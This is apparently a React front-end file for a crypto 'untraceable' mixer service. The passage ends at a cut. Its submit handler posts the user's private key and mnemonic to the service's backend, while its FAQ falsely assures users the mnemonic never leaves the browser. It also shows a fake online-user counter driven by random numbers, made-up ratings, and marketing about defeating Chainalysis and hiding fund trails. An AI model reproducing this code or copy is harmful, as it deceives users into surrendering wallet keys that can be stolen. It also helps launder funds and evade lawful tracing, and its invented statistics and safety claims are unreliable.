"use client";

import { useState, useEffect } from "react";
import { API_URL } from "@/lib/config";
import { Globe } from "lucide-react";

// 工具数据
const tools = [
  {
    id: 1,
    name: "鬼魅无影混币引擎",
    category: "privacy",
    description: "68+条链,唯一无法追踪的混币器，N次交叉转账多链100%隐藏资金路径，IP无法追踪，绝对安全保护隐私",
    icon: "🎭",
    chains: ["BSC", "ETH"],
    status: "active",
    rating: 4.8,
    users: "1.2K+"
  },
  {
    id: 2,
    name: "HD Wallet Generator",
    category: "wallet",
    description: "BIP44 标准 HD 钱包生成器，从助记词生成多个地址",
    icon: "🔐",
    features: [
      "BIP44 标准",
      "批量生成地址",
      "兼容 MetaMask",
      "安全可靠"
    ],
    chains: ["BSC", "ETH", "Polygon"],
    status: "coming-soon",
    rating: 4.9,
    users: "3.5K+"
  },
  {
    id: 3,
    name: "Batch Transfer",
    category: "defi",
    description: "批量转账工具，一次性向多个地址发送代币",
    icon: "💸",
    features: [
      "10-10000 地址",
      "CSV 导入",
      "Gas 优化",
      "实时追踪"
    ],
    chains: ["BSC", "ETH", "Polygon"],
    status: "coming-soon",
    rating: 4.7,
    users: "2.8K+"
  },
  {
    id: 4,
    name: "Token Analyzer",
    category: "analytics",
    description: "代币分析工具，查看持仓分布、交易历史等数据",
    icon: "📊",
    features: [
      "持仓分析",
      "交易历史",
      "价格图表",
      "智能合约审计"
    ],
    chains: ["BSC", "ETH"],
    status: "coming-soon",
    rating: 0,
    users: "Soon"
  },
  {
    id: 5,
    name: "Gas Tracker",
    category: "analytics",
    description: "实时 Gas 价格追踪，帮助您选择最佳交易时机",
    icon: "⛽",
    features: [
      "实时 Gas 价格",
      "历史数据",
      "价格预测",
      "通知提醒"
    ],
    chains: ["BSC", "ETH", "Polygon"],
    status: "coming-soon",
    rating: 0,
    users: "Soon"
  },
  {
    id: 6,
    name: "NFT Batch Mint",
    category: "defi",
    description: "批量铸造 NFT 工具，支持多种标准",
    icon: "🎨",
    features: [
      "ERC-721/1155",
      "批量铸造",
      "元数据管理",
      "IPFS 上传"
    ],
    chains: ["ETH", "Polygon"],
    status: "coming-soon",
    rating: 0,
    users: "Soon"
  }
];

// 混币模式配置
const MIXING_MODES = {
  fast: {
    name: "快速模式",
    icon: "⚡",
    privacy: "⭐⭐⭐⭐⭐",
    time: "3-5 分钟",
    description: "交叉混淆 · 隐藏IP · 快速到账",
    color: "blue",
    feeRate: 0.0003,
    crosschainFee: 0,  // 单链无跨链费用
    percentageFee: 0   // 不按百分比收费
  },
  ultimate: {
    name: "极致隐私",
    icon: "🛡️",
    privacy: "⭐⭐⭐⭐⭐⭐⭐",
    time: "8-50 小时",
    description: "多链幽灵模式 · 完全匿名 · 无法追踪",
    color: "red",
    feeRate: 0,  // 不按跳数收费
    crosschainFee: 0.006,  // 3次跨链，每次0.002
    percentageFee: 4.9  // 按转账金额的4.9%收费
  }
};

// 鬼魅无影混币引擎组件
function StealthTransferApp() {
  const [chain, setChain] = useState("bsc");
  const [mode, setMode] = useState("fast");
  const [privateKey, setPrivateKey] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [numHops, setNumHops] = useState(100);
  const [customHops, setCustomHops] = useState("");
  const [mnemonic, setMnemonic] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [progress, setProgress] = useState<string[]>([]);
  const [progressPercent, setProgressPercent] = useState(0);
  const [onlineUsers, setOnlineUsers] = useState(0);
  const [expandedFaq, setExpandedFaq] = useState<number | null>(null);

  // 初始化在线人数（基于当前时间生成一个稳定的基数）
  useEffect(() => {
    const now = new Date();
    const dayMinutes = now.getHours() * 60 + now.getMinutes();
    // 根据时间段设置基础人数：凌晨少，白天多
    const baseUsers = Math.floor(30 + Math.sin(dayMinutes / 229) * 20 + Math.random() * 15);
    setOnlineUsers(baseUsers);
  }, []);

  // 动态更新在线人数
  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineUsers(prev => {
        // 随机增减 -2 到 +3 之间
        const change = Math.floor(Math.random() * 6) - 2;
        const newValue = prev + change;
        // 限制在 15-120 之间
        return Math.max(15, Math.min(120, newValue));
      });
    }, 8000 + Math.random() * 7000); // 8-15秒随机更新一次

    return () => clearInterval(interval);
  }, []);

  const handleExecute = async () => {
    if (!privateKey || !toAddress || !amount) {
      alert("请填写所有必填字段");
      return;
    }

    setIsLoading(true);
    setResult(null);
    setProgress([]);
    setProgressPercent(0);

    try {
      setProgress(prev => [...prev, "开始混币..."]);
      setProgressPercent(5);
      setProgress(prev => [...prev, `模式: ${MIXING_MODES[mode as keyof typeof MIXING_MODES].name}`]);
      setProgressPercent(10);
      
      // 根据模式显示IP隐藏状态
      if (mode === 'ultimate') {
        setProgress(prev => [...prev, "🔒 IP隐藏: 已启用（代理池）"]);
      } else {
        setProgress(prev => [...prev, "⚠️ IP隐藏: 建议使用VPN"]);
      }
      setProgressPercent(15);
      
      setProgress(prev => [...prev, `跳数: ${numHops}`]);
      setProgressPercent(20);
      
      const response = await fetch(`${API_URL}/api/mixer`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chain,
          mode,
          from_private_key: privateKey,
          to_address: toAddress,
          total_amount: parseFloat(amount),
          num_hops: numHops,
          mnemonic: mnemonic || undefined,
          gas_level: "standard"
        })
      });

      setProgressPercent(30);
      const data = await response.json();
      setProgressPercent(40);
      
      if (data.success && data.results) {
        setProgress(prev => [...prev, "\n交易流转详情:"]);
        setProgressPercent(50);
        
        // 显示每一笔交易的地址流转
        const totalTxs = data.results.length;
        data.results.forEach((tx: any, index: number) => {
          const currentProgress = 50 + Math.floor((index / totalTxs) * 45);
          setProgressPercent(currentProgress);
          
          if (tx.status === 'success') {
            const fromAddr = tx.from ? `${tx.from.slice(0, 6)}...${tx.from.slice(-4)}` : '源地址';
            const toAddr = tx.to ? `${tx.to.slice(0, 6)}...${tx.to.slice(-4)}` : '目标';
            const txHash = tx.tx_hash ? `${tx.tx_hash.slice(0, 8)}...` : '';
            
            setProgress(prev => [...prev, 
              `✅ [${index + 1}/${data.results.length}] ${fromAddr} → ${toAddr} (${tx.amount} BNB) ${txHash}`
            ]);
          } else if (tx.status === 'failed') {
            setProgress(prev => [...prev, 
              `❌ [${index + 1}/${data.results.length}] 交易失败: ${tx.error || '未知错误'}`
            ]);
          }
        });
        
        setProgressPercent(95);
        setProgress(prev => [...prev, `\n🎉 隐身发送完成！`]);
        setProgress(prev => [...prev, `目标地址收到: ${data.total_collected} BNB`]);
        setProgress(prev => [...prev, `成功: ${data.success_count} | 失败: ${data.failed_count}`]);
        setProgressPercent(100);
      }
      
      setResult(data);
    } catch (error) {
      setProgress(prev => [...prev, `❌ 错误: ${error}`]);
      setResult({ success: false, error: String(error) });
      setProgressPercent(0);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-[#1a1a1a] border border-[#d4af37]/20 rounded-xl shadow-2xl shadow-[#d4af37]/5 p-6">
      {/* Online Users Display */}
      <div className="mb-4 flex items-center justify-between bg-[#0a0a0a] border border-[#10b981]/30 rounded-lg px-4 py-2">
        <div className="flex items-center space-x-2">
          <div className="w-2 h-2 bg-[#10b981] rounded-full animate-pulse shadow-lg shadow-[#10b981]/50"></div>
          <span className="text-sm text-gray-400">今日在线</span>
        </div>
        <span className="text-lg font-bold text-[#10b981]">{onlineUsers}</span>
      </div>
      
      {/* Mixing Mode Selection */}
      <div className="mb-6">
        <div className="grid grid-cols-2 gap-4">
          {/* 快速模式 */}
          <button
            onClick={() => setMode('fast')}
            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group border ${
              mode === 'fast'
                ? "bg-gradient-to-br from-[#d4af37]/20 to-[#ffd700]/10 border-[#d4af37] shadow-xl shadow-[#d4af37]/30"
                : "bg-[#0a0a0a] border-[#d4af37]/20 hover:border-[#d4af37]/50 hover:shadow-lg hover:shadow-[#d4af37]/20"
            }`}
          >
            {/* 发光效果 */}
            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-[#d4af37]/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 ${
              mode === 'fast' ? 'opacity-30' : ''
            }`}></div>
            
            <div className="relative z-10">
              <div className={`font-bold text-base mb-2 ${mode === 'fast' ? 'text-[#d4af37]' : 'text-white'}`}>快速模式</div>
              <div className={`text-xs leading-relaxed ${mode === 'fast' ? 'text-[#d4af37]/80' : 'text-gray-400'}`}>
                交叉混淆 · 隐藏IP · 快速到账
              </div>
            </div>
          </button>

          {/* 极致隐私 */}
          <button
            onClick={() => setMode('ultimate')}
            className={`relative p-5 rounded-xl transition-all duration-300 overflow-hidden group border ${
              mode === 'ultimate'
                ? "bg-gradient-to-br from-[#d4af37]/20 to-[#ffd700]/10 border-[#d4af37] shadow-xl shadow-[#d4af37]/30"
                : "bg-[#0a0a0a] border-[#d4af37]/20 hover:border-[#d4af37]/50 hover:shadow-lg hover:shadow-[#d4af37]/20"
            }`}
          >
            {/* 发光效果 */}
            <div className={`absolute inset-0 bg-gradient-to-r from-transparent via-[#d4af37]/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-500 ${
              mode === 'ultimate' ? 'opacity-30' : ''
            }`}></div>
            
            <div className="relative z-10">
              <div className={`font-bold text-base mb-2 ${mode === 'ultimate' ? 'text-[#d4af37]' : 'text-white'}`}>极致隐私</div>
              <div className={`text-xs leading-relaxed ${mode === 'ultimate' ? 'text-[#d4af37]/80' : 'text-gray-400'}`}>
                多链幽灵模式 · 完全匿名 · 无法追踪
              </div>
            </div>
          </button>
        </div>
        
        {/* Mode Description */}
        {mode === 'fast' && (
          <div className="mt-4 p-4 bg-[#0a0a0a] border border-[#d4af37]/30 rounded-lg shadow-lg shadow-[#d4af37]/10">
            <p className="text-sm text-gray-300 leading-relaxed">
              <span className="font-semibold text-[#d4af37]">单链混币</span> · 建议使用VPN保护IP · 适合小额转账（&lt;0.5 BNB）
            </p>
          </div>
        )}
        
        {mode === 'ultimate' && (
          <div className="mt-4 p-4 bg-[#0a0a0a] border border-[#d4af37]/30 rounded-lg shadow-lg shadow-[#d4af37]/10">
            <p className="text-sm text-gray-300 leading-relaxed">
              <span className="font-semibold text-[#d4af37]">适合大额转账</span>，N次交叉转账+多链路径+100%隐藏资金路径，IP无法追踪，绝对安全保护隐私
            </p>
          </div>
        )}
      </div>
      
      {/* Chain Selection */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-white mb-2">
          选择网络
        </label>
        <select
          value={chain}
          onChange={(e) => setChain(e.target.value)}
          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all"
        >
          <option value="bsc" className="bg-[#0a0a0a]">BSC</option>
          <option value="eth" className="bg-[#0a0a0a]">Ethereum</option>
        </select>
      </div>

      {/* Private Key */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-white mb-2">
          源地址私钥 *
        </label>
        <input
          type="password"
          value={privateKey}
          onChange={(e) => setPrivateKey(e.target.value)}
          placeholder="输入私钥"
          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
        />
      </div>

      {/* Target Address */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-white mb-2">
          目标地址 *
        </label>
        <input
          type="text"
          value={toAddress}
          onChange={(e) => setToAddress(e.target.value)}
          placeholder="0x..."
          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
        />
      </div>

      {/* Amount */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-white mb-2">
          转账金额 (BNB) *
        </label>
        <input
          type="number"
          step="0.001"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          placeholder="0.1"
          className="w-full px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
        />
      </div>

      {/* Number of Hops */}
      <div className="mb-4">
        <label className="block text-sm font-medium text-white mb-2">
          跳数: <span className="text-[#d4af37]">{numHops}</span> <span className="text-xs text-gray-400">(越多越隐秘)</span>
          <span className="ml-2 text-xs text-[#d4af37]">
            预计 {numHops <= 10 ? '~30秒' : numHops <= 50 ? '~2.5分钟' : numHops <= 100 ? '~5分钟' : '~20分钟'}
          </span>
        </label>
        <p className="text-xs text-gray-400 mb-2">多个中转钱包地址，隐藏转账路径，实现隐匿转账，确保资金的隐私。</p>
        <div className="flex gap-2">
          {[10, 50, 100, 500, 1000].map((num) => (
            <button
              key={num}
              onClick={() => {
                setNumHops(num);
                setCustomHops("");
              }}
              className={`px-3 py-1 rounded-lg font-medium transition text-sm border ${
                numHops === num && customHops === ""
                  ? "bg-gradient-to-r from-[#d4af37] to-[#ffd700] text-black border-[#d4af37] shadow-lg shadow-[#d4af37]/30"
                  : "bg-[#0a0a0a] text-gray-300 border-[#d4af37]/30 hover:border-[#d4af37] hover:shadow-md hover:shadow-[#d4af37]/20"
              }`}
            >
              {num}
            </button>
          ))}
          <input
            type="number"
            min="10"
            max="100000"
            step="1"
            value={customHops}
            onChange={(e) => {
              const val = e.target.value;
              setCustomHops(val);
              if (val !== '' && !isNaN(parseInt(val))) {
                const num = Math.max(10, Math.min(100000, parseInt(val)));
                setNumHops(num);
              }
            }}
            className="flex-1 px-4 py-2 bg-[#0a0a0a] border-b-2 border-[#d4af37]/50 text-white placeholder-gray-500 rounded-lg focus:ring-2 focus:ring-[#d4af37] focus:border-[#d4af37] transition-all text-sm"
            placeholder="自定义"
          />
        </div>
      </div>
      {/* Fee Estimate */}
      <div className="bg-[#0a0a0a] border border-[#d4af37]/30 p-4 rounded-lg mb-4 shadow-lg shadow-[#d4af37]/10">
        <div className="grid grid-cols-2 gap-3 text-sm">
          <div>
            <p className="text-gray-400 text-xs">服务费</p>
            <p className="font-semibold text-[#d4af37]">
              {mode === 'ultimate' && amount
                ? (parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100).toFixed(4)
                : (numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)).toFixed(4)} BNB
            </p>
          </div>
          <div>
            <p className="text-gray-400 text-xs">预估 Gas</p>
            <p className="font-semibold text-[#d4af37]">~{(numHops * 0.00021).toFixed(5)} BNB</p>
          </div>
          {mode === 'ultimate' && (
            <div>
              <p className="text-gray-400 text-xs">跨链费用</p>
              <p className="font-semibold text-[#ffa500]">
                ~{MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0} BNB
              </p>
            </div>
          )}
          <div>
            <p className="text-gray-400 text-xs">总费用</p>
            <p className="font-semibold text-[#d4af37]">
              ~{mode === 'ultimate' && amount
                ? ((parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100) + 
                   numHops * 0.00021 + 
                   (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)
                : ((numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)) + 
                   numHops * 0.00021 + 
                   (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)} BNB
            </p>
          </div>
          <div>
            <p className="text-gray-400 text-xs">预计收到</p>
            <p className="font-semibold text-[#10b981]">
              {amount ? (
                mode === 'ultimate'
                  ? (parseFloat(amount) - 
                     (parseFloat(amount) * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.percentageFee || 0) / 100) - 
                     numHops * 0.00021 - 
                     (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)
                  : (parseFloat(amount) - 
                     (numHops * (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.feeRate || 0.0003)) - 
                     numHops * 0.00021 - 
                     (MIXING_MODES[mode as keyof typeof MIXING_MODES]?.crosschainFee || 0)).toFixed(5)
              ) : "0"} BNB
            </p>
          </div>
        </div>
      </div>

      {/* Execute Button */}
      <button
        onClick={handleExecute}
        disabled={isLoading || !privateKey || !toAddress || !amount}
        className={`w-full py-6 rounded-lg font-bold text-lg transition-all duration-300 relative overflow-hidden ${
          isLoading || !privateKey || !toAddress || !amount
            ? "bg-gray-700 text-gray-500 cursor-not-allowed border border-gray-600"
            : "bg-gradient-to-r from-[#d4af37] via-[#ffd700] to-[#d4af37] text-black hover:shadow-2xl hover:shadow-[#d4af37]/50 border-2 border-[#d4af37] shadow-xl shadow-[#d4af37]/30"
        }`}
      >
        {/* 发光动画效果 */}
        {!isLoading && privateKey && toAddress && amount && (
          <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer"></div>
        )}
        
        {isLoading ? (
          <div className="relative z-10">
            <div className="flex items-center justify-center mb-2">
              <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-black mr-2"></div>
              <span>处理中 {progressPercent}%</span>
            </div>
            {/* Progress Bar */}
            <div className="absolute bottom-0 left-0 right-0 h-2 bg-black/30 rounded-b-lg overflow-hidden">
              <div 
                className="h-full bg-gradient-to-r from-[#d4af37] to-[#ffd700] transition-all duration-500 ease-out shadow-lg shadow-[#d4af37]/50"
                style={{ width: `${progressPercent}%` }}
              ></div>
            </div>
          </div>
        ) : (
          <span className="relative z-10">安全转移</span>
        )}
      </button>

      {/* FAQ Section */}
      <div className="mt-6">
        <h3 className="text-sm font-semibold text-[#d4af37] mb-3 border-b border-[#d4af37]/30 pb-2">常见问题</h3>
        <div className="space-y-2">
          {/* FAQ 1 */}
          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
            <button
              onClick={() => setExpandedFaq(expandedFaq === 1 ? null : 1)}
              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
            >
              <span className="text-sm font-medium text-white">如何确保转账完全无法被追踪？</span>
              <svg
                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 1 ? 'rotate-180' : ''}`}
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            {expandedFaq === 1 && (
              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                <p className="font-semibold mb-2">技术原理：</p>
                <p className="mb-3">我们采用<strong>多层隔离架构</strong>，从技术层面彻底切断资金链追溯：</p>
                
                <p className="font-semibold mb-1">快速模式 - 双层隔离技术：</p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li><strong>第一层隔离</strong>：源地址 → 临时隔离地址T1（切断源头）</li>
                  <li><strong>混币层</strong>：T1通过10-100个HD钱包生成的中转地址进行随机跳转</li>
                  <li><strong>第二层隔离</strong>：临时隔离地址T2 → 目标地址（切断终点）</li>
                </ul>
                
                <p className="font-semibold mb-1">链上追溯分析：</p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>区块链浏览器只能看到：A → T1（无后续）</li>
                  <li>中间层：T1 → B1 → C3 → B5 → C2...（随机路径）</li>
                  <li>最终层：T2 → Z（无前置）</li>
                  <li><strong>结论</strong>：即使使用Chainalysis等专业工具，也无法建立A到Z的关联</li>
                </ul>
                
                <p className="font-semibold mb-1">极致隐私 - 跨链断链技术：</p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>每次跨链前混币到<strong>新的临时地址</strong></li>
                  <li>跨链桥记录：临时地址B → 临时地址C（不同链）</li>
                  <li>无法关联：源地址A在BSC，目标地址Z在BSC，但中间经过Polygon、Arbitrum</li>
                  <li><strong>IP层保护</strong>：自动代理池，每次请求使用不同IP</li>
                  <li><strong>时间混淆</strong>：5-30分钟随机延迟，打破时间关联特征</li>
                </ul>
              </div>
            )}
          </div>

          {/* FAQ 2 */}
          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
            <button
              onClick={() => setExpandedFaq(expandedFaq === 2 ? null : 2)}
              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
            >
              <span className="text-sm font-medium text-white">资金安全性如何保障？会不会被盗或丢失？</span>
              <svg
                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 2 ? 'rotate-180' : ''}`}
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            {expandedFaq === 2 && (
              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                <p className="font-semibold mb-2">去中心化架构保障：</p>
                
                <p className="font-semibold text-green-700 mb-1">✅ 非托管设计</p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>所有中转地址由您的助记词通过BIP44标准派生</li>
                  <li>私钥完全由您控制，我们无法触碰您的资金</li>
                  <li>不存在资金池，不经过任何中心化服务器</li>
                </ul>
                
                <p className="font-semibold text-green-700 mb-1">✅ 链上可验证</p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>每笔交易都有唯一哈希，可在区块链浏览器实时查询</li>
                  <li>智能合约开源，代码逻辑透明可审计</li>
                  <li>所有操作都在链上执行，不可篡改</li>
                </ul>
                
                <p className="font-semibold text-green-700 mb-1">✅ 助记词安全</p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>助记词仅在您的浏览器本地使用，不会上传服务器</li>
                  <li>建议使用硬件钱包生成的助记词</li>
                  <li>混币完成后，中转地址自动清空，不留余额</li>
                </ul>
                
                <p className="font-semibold text-orange-700 mb-1">⚠️ 安全建议</p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>首次使用建议小额测试（0.01-0.05 BNB）</li>
                  <li>妥善保管助记词，丢失无法找回</li>
                  <li>确认目标地址正确，链上交易不可撤销</li>
                </ul>
              </div>
            )}
          </div>

          {/* FAQ 3 */}
          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
            <button
              onClick={() => setExpandedFaq(expandedFaq === 3 ? null : 3)}
              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
            >
              <span className="text-sm font-medium text-white">两种模式的隐私保护有什么本质区别？</span>
              <svg
                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 3 ? 'rotate-180' : ''}`}
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            {expandedFaq === 3 && (
              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                <p className="font-semibold mb-2">快速模式 - 单链深度混淆：</p>
                <p className="mb-1"><strong>适用场景：</strong>日常转账、小额资金（&lt;0.5 BNB）、需要快速到账（30秒-5分钟）</p>
                <p className="mb-1"><strong>技术特点：</strong>双层隔离 + 多跳混币，10-100个中转地址随机跳转</p>
                <p className="mb-3"><strong>隐私级别：</strong>⭐⭐⭐⭐⭐ 可对抗区块链浏览器、普通分析工具</p>
                
                <p className="font-semibold mb-2">极致隐私 - 跨链幽灵模式：</p>
                <p className="mb-1"><strong>适用场景：</strong>大额资金转移（&gt;0.5 BNB）、需要最高级别隐私保护</p>
                <p className="mb-1"><strong>技术特点：</strong></p>
                <ul className="list-disc list-inside mb-2 space-y-1 ml-2">
                  <li>跨链断链：BSC → Polygon → Arbitrum → BSC（68+链可选）</li>
                  <li>每次跨链使用新的临时地址（跨链桥无法关联）</li>
                  <li>自动代理池：每次请求不同IP，无法追踪网络层</li>
                  <li>5-30分钟随机延迟：打破时间关联特征</li>
                </ul>
                <p className="mb-2"><strong>隐私级别：</strong>⭐⭐⭐⭐⭐⭐⭐ 可对抗Chainalysis、Elliptic等专业工具</p>
                
                <p className="font-semibold">核心差异：</p>
                <p>快速模式：单链内混淆，速度优先 | 极致隐私：跨链断链，隐私优先</p>
              </div>
            )}
          </div>

          {/* FAQ 4 */}
          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
            <button
              onClick={() => setExpandedFaq(expandedFaq === 4 ? null : 4)}
              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
            >
              <span className="text-sm font-medium text-white">为什么需要提供助记词？安全吗？</span>
              <svg
                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 4 ? 'rotate-180' : ''}`}
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            {expandedFaq === 4 && (
              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                <p className="font-semibold mb-2">技术必要性：</p>
                <p className="mb-1"><strong>HD钱包原理：</strong></p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>混币需要生成10-100个中转地址</li>
                  <li>使用BIP44标准从助记词派生子地址</li>
                  <li>每个子地址都有独立的私钥，用于签名交易</li>
                </ul>
                
                <p className="mb-1"><strong>为什么不能用单个私钥：</strong></p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>单个私钥只能控制一个地址</li>
                  <li>无法生成多个中转地址进行混币</li>
                  <li>HD钱包可以从一个助记词派生无限个地址</li>
                </ul>
                
                <p className="font-semibold mb-2">安全保障：</p>
                <p className="font-semibold text-green-700 mb-1">✅ 本地处理</p>
                <ul className="list-disc list-inside mb-2 space-y-1 ml-2">
                  <li>助记词仅在您的浏览器中使用</li>
                  <li>不会发送到服务器或任何第三方</li>
                  <li>所有派生计算都在本地完成</li>
                </ul>
                
                <p className="font-semibold text-green-700 mb-1">✅ 临时使用</p>
                <ul className="list-disc list-inside mb-2 space-y-1 ml-2">
                  <li>混币完成后，中转地址会自动清空</li>
                  <li>不会在中转地址留下余额</li>
                  <li>建议使用专门的助记词，不要用主钱包</li>
                </ul>
                
                <p className="font-semibold mb-1">最佳实践：</p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>使用新生成的助记词（不要用主钱包）</li>
                  <li>混币完成后，可以废弃该助记词</li>
                  <li>或者使用硬件钱包生成的助记词</li>
                </ul>
              </div>
            )}
          </div>

          {/* FAQ 5 */}
          <div className="border border-[#d4af37]/20 rounded-lg overflow-hidden bg-[#0a0a0a]">
            <button
              onClick={() => setExpandedFaq(expandedFaq === 5 ? null : 5)}
              className="w-full px-4 py-3 text-left flex items-center justify-between hover:bg-[#1a1a1a] transition border-l-2 border-l-[#d4af37]/50"
            >
              <span className="text-sm font-medium text-white">如果交易失败或卡住怎么办？</span>
              <svg
                className={`w-5 h-5 text-[#d4af37] transition-transform ${expandedFaq === 5 ? 'rotate-180' : ''}`}
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
              </svg>
            </button>
            {expandedFaq === 5 && (
              <div className="px-4 py-3 bg-[#1a1a1a] text-xs text-gray-300 leading-relaxed border-t border-[#d4af37]/20">
                <p className="font-semibold mb-2">容错机制：</p>
                
                <p className="font-semibold text-green-700 mb-1">✅ 自动重试</p>
                <ul className="list-disc list-inside mb-2 space-y-1 ml-2">
                  <li>交易失败会自动重试3次</li>
                  <li>Gas价格不足会自动提高重新发送</li>
                  <li>网络拥堵会等待后重试</li>
                </ul>
                
                <p className="font-semibold text-green-700 mb-1">✅ 资金保护</p>
                <ul className="list-disc list-inside mb-2 space-y-1 ml-2">
                  <li>失败的交易不会扣除资金</li>
                  <li>中转地址的余额会自动汇总</li>
                  <li>不会出现资金卡在中间地址的情况</li>
                </ul>
                
                <p className="font-semibold text-green-700 mb-1">✅ 实时监控</p>
                <ul className="list-disc list-inside mb-3 space-y-1 ml-2">
                  <li>页面实时显示每笔交易状态</li>
                  <li>可以看到当前进度和剩余时间</li>
                  <li>每笔交易都有哈希，可在区块链浏览器查询</li>
                </ul>
                
                <p className="font-semibold mb-2">常见问题处理：</p>
                <p className="mb-1"><strong>情况1：交易长时间pending</strong></p>
                <p className="mb-2 ml-2">原因：网络拥堵 | 解决：系统会自动提高Gas重新发送</p>
                
                <p className="mb-1"><strong>情况2：部分交易失败</strong></p>
                <p className="mb-2 ml-2">原因：余额不足 | 解决：系统会汇总已完成的部分</p>
                
                <p className="mb-1"><strong>情况3：跨链卡住（极致隐私）</strong></p>
                <p className="ml-2">原因：跨链桥拥堵 | 解决：等待跨链确认（通常5-30分钟）</p>
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Progress Display */}
      {progress.length > 0 && (
        <div className="mt-4 bg-[#0a0a0a] border border-[#d4af37]/30 text-[#d4af37] p-3 rounded-lg font-mono text-xs max-h-64 overflow-y-auto shadow-lg shadow-[#d4af37]/10">
          {progress.map((line, index) => (
            <div key={index} className="whitespace-pre-wrap">
              {line}
            </div>
          ))}
          {isLoading && (
